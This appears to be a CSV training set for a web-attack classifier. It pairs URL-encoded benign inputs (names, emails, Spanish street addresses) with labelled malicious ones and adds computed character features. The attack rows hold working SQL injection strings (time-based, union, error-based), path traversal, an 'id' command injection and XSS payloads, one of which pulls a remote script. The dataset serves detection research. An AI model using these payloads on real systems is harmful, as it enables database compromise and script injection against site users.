payload,payload_len,alpha,non_alpha,attack_feature,label
41392002y,9,100.0,0.0,0.0,0
toroborg%40cpanelweb.kp,21,100.0,0.0,0.0,0
t2naja,6,100.0,0.0,0.0,0
joab,4,100.0,0.0,0.0,0
gull%20steinle,12,100.0,0.0,0.0,0
amaro,5,100.0,0.0,0.0,0
amadeo,6,100.0,0.0,0.0,0
maiga,5,100.0,0.0,0.0,0
baqu,4,100.0,0.0,0.0,0
/0x2e0x2ex2e0x2ex2e0x2ex2e0x2e%7Bfile%7D,36,94.44444444444444,5.555555555555557,5.882352941176473,1
1%25%22%20and%208312%3Ddbms_pipe.receive_message%28chr%2869%29%7C%7Cchr%2879%29%7C%7Cchr%28101%29%7C%7Cchr%2868%29%2C5%29--,79,68.35443037974683,31.645569620253166,30000.0,1
40,2,100.0,0.0,0.0,0
1648,4,100.0,0.0,0.0,0
a2a9ra3-a3,10,100.0,0.0,0.0,0
rio%20esgueva%2057%201%3Fg,18,100.0,0.0,0.0,0
andrcies,8,100.0,0.0,0.0,0
marchard%40mailboxrussia.kw,25,100.0,0.0,0.0,0
bailina%20quijad,14,100.0,0.0,0.0,0
28092111a,9,100.0,0.0,0.0,0
1%20where%205359%3D5359%20and%204386%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284386%3D4386%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29--,218,73.85321100917432,26.146788990825687,90000.0,1
18210,5,100.0,0.0,0.0,0
1%27%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,63,80.95238095238095,19.047619047619047,60000.0,1
00nd11e0,8,100.0,0.0,0.0,0
yamasaki%40multaspendientes.eg,28,100.0,0.0,0.0,0
1%20and%203754%3D%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%283754%3D3754%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%7C%7Cchr%2862%29%29%29%20from%20dual%29--%20xwoo,240,71.66666666666667,28.333333333333332,99000.0,1
seriano-reeggiero%40distritoeste.pk,33,100.0,0.0,0.0,0
1%29%29%20as%20xcsm%20where%209231%3D9231%3Bselect%20sleep%285%29%23,44,84.0909090909091,15.909090909090908,30000.0,1
1%27%20in%20boolean%20mode%29%20or%20%28select%209173%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29%23,190,83.15789473684211,16.842105263157894,60000.0,1
1%29%29%3B%28select%20%2A%20from%20%28select%28sleep%285%29%29%29acdk%29%23,43,69.76744186046511,30.23255813953488,30000.0,1
inescourt7%40citycvs.mil,22,100.0,0.0,0.0,0
traspasar,9,100.0,0.0,0.0,0
mala.kuenneke%40convention.sk,27,100.0,0.0,0.0,0
4.84794E+15,16,68.75,31.25,45.45454545454545,0
zapasiewicz%40pinkplanetplasencia.bn,34,100.0,0.0,0.0,0
1%25%22%29%20procedure%20analyse%28extractvalue%285840%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28case%20when%20%285840%3D5840%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%29%29%2C1%29%20and%20%28%22%25%22%3D%22,145,81.37931034482759,18.620689655172416,30000.0,1
1%27%29%29%29%20and%206414%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29%20and%20%28%28%28%27hryb%27%3D%27hryb,131,81.67938931297711,18.3206106870229,90000.0,1
-7610%27%20or%203038%3D3038,19,84.21052631578947,15.789473684210526,30000.0,1
40197,5,100.0,0.0,0.0,0
jeshua,6,100.0,0.0,0.0,0
perpi%20izurrieta,15,100.0,0.0,0.0,0
mastelero,9,100.0,0.0,0.0,0
1%27%7C%7C%28select%20%27qgnz%27%20where%206446%3D6446%3Bselect%20count%28%2A%29%20from%20generate_series%281%2C5000000%29--,84,79.76190476190477,20.238095238095237,60000.0,1
vislumbrar,10,100.0,0.0,0.0,0
stewart,7,100.0,0.0,0.0,0
agote%20lledos,12,100.0,0.0,0.0,0
1%27%29%29%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--,29,62.06896551724138,37.93103448275862,30000.0,1
-4317%22%29%29%20as%20nxvn%20where%202566%3D2566%20union%20all%20select%202566%2C2566%2C2566%23,65,87.6923076923077,12.307692307692308,90000.0,1
1%22%29%20where%207471%3D7471%20or%20char%2875%29%7C%7Cchar%2870%29%7C%7Cchar%2899%29%7C%7Cchar%2883%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,157,71.97452229299363,28.02547770700637,60000.0,1
1%27%20in%20boolean%20mode%29%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5--,107,84.11214953271028,15.887850467289718,30000.0,1
1%29%20as%20oblq%20where%202002%3D2002%20or%20updatexml%281808%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%281808%3D1808%2C1%29%29%29%2C0x717a767a71%29%2C8666%29--,119,82.35294117647058,17.647058823529413,60000.0,1
1%22%29%29%29%20or%208466%3Dbenchmark%285000000%2Cmd5%280x694a4745%29%29%20and%20%28%28%28%22ijag%22%3D%22ijag,68,75.0,25.0,60000.0,1
selbrede,8,100.0,0.0,0.0,0
sauprobo,8,100.0,0.0,0.0,0
valentino%20ruiz,14,100.0,0.0,0.0,0
olalia,6,100.0,0.0,0.0,0
d2s7sp79ro,10,100.0,0.0,0.0,0
aldeano,7,100.0,0.0,0.0,0
1%29%29%20as%20oqui%20where%203368%3D3368%20order%20by%201--,40,87.5,12.5,60000.0,1
1%27%29%29%20and%203526%3D1354,18,77.77777777777779,22.22222222222222,30000.0,1
1%20and%208407%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%23%20tqmr,66,83.33333333333334,16.666666666666664,60000.0,1
cifuentes%20masloski,18,100.0,0.0,0.0,0
iraci,5,100.0,0.0,0.0,0
5.65712E+15,16,68.75,31.25,45.45454545454545,0
1%25%22%3Bbegin%20user_lock.sleep%285%29%3B%20end--,35,82.85714285714286,17.14285714285714,20.689655172413786,1
sisante,7,100.0,0.0,0.0,0
troule%20politi,13,100.0,0.0,0.0,0
1%27%3Bselect%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%20and%20%27fahy%27%20like%20%27fahy,72,83.33333333333334,16.666666666666664,90000.0,1
6380,5,80.0,20.0,25.0,0
28045405x,9,100.0,0.0,0.0,0
medey,5,100.0,0.0,0.0,0
byrgesen,8,100.0,0.0,0.0,0
mamantona,9,100.0,0.0,0.0,0
abbot,5,100.0,0.0,0.0,0
3749,4,100.0,0.0,0.0,0
1%22%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,71,83.09859154929578,16.901408450704224,60000.0,1
c/%20tercio%20de%20afora%2099%208-b,25,100.0,0.0,0.0,0
%3Cinput%20id%3Dxss%20onfocus%3Djavascript%3Aeval%28string%5B%27fromcharcode%27%5D%2897%2C108%2C101%2C114%2C116%2C40%2C39%2C120%2C115%2C115%2C39%2C41%2C32%29%29%20autofocus%3E,119,78.99159663865547,19.327731092436977,30000.0,1
san%20bartolom%20de%20las%20abiertas,28,100.0,0.0,0.0,0
palls%20de%20buran,14,100.0,0.0,0.0,0
1%27%2B%28select%20syrz%20where%207699%3D7699%20union%20all%20select%20null%2Cnull%2Cnull%23,64,89.0625,10.9375,90000.0,1
1%27%20where%209116%3D9116%20and%20char%28107%29%7C%7Cchar%28121%29%7C%7Cchar%2897%29%7C%7Cchar%2880%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,159,72.95597484276729,27.044025157232703,60000.0,1
9.74327E+15,16,68.75,31.25,45.45454545454545,0
6h11a3rud9,10,100.0,0.0,0.0,0
a%29%7Cid,5,60.0,40.0,66.66666666666666,1
4629de1,7,100.0,0.0,0.0,0
hortensia,9,100.0,0.0,0.0,0
1%29%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--,27,66.66666666666666,33.33333333333333,30000.0,1
aizpuru%20cerusoli,16,100.0,0.0,0.0,0
05782219l,9,100.0,0.0,0.0,0
1%20and%203715%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%283715%3D3715%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29,182,75.27472527472527,24.725274725274726,30000.0,1
78901606z,9,100.0,0.0,0.0,0
auzmendi%20ario,13,100.0,0.0,0.0,0
-4389%27%29%29%29%20or%20%281139%3D3499%29%2A3499%20and%20%28%28%28%27qoch%27%3D%27qoch,49,67.3469387755102,32.6530612244898,60000.0,1
-8010%27%20or%20%282225%3D8491%29%2A8491%20and%20%27eipf%27%3D%27eipf,43,76.74418604651163,23.25581395348837,60000.0,1
marbella,8,100.0,0.0,0.0,0
c/%20grabador%20david%20roberts%20154%201-h,33,100.0,0.0,0.0,0
%3Cscript%20a%3D%22%3E%22%20%27%27%20id%3Dxss%20src%3D%22http%3A//ha.ckers.org/xss.js%22%3E%3C/script%3E,66,81.81818181818183,18.181818181818173,22.22222222222221,1
gastn,5,100.0,0.0,0.0,0
calle%20colegio%20mayor%20goimendi%2072%204%3Fd,35,100.0,0.0,0.0,0
marty%40telogis.mv,16,100.0,0.0,0.0,0
33t40io4a563,12,100.0,0.0,0.0,0
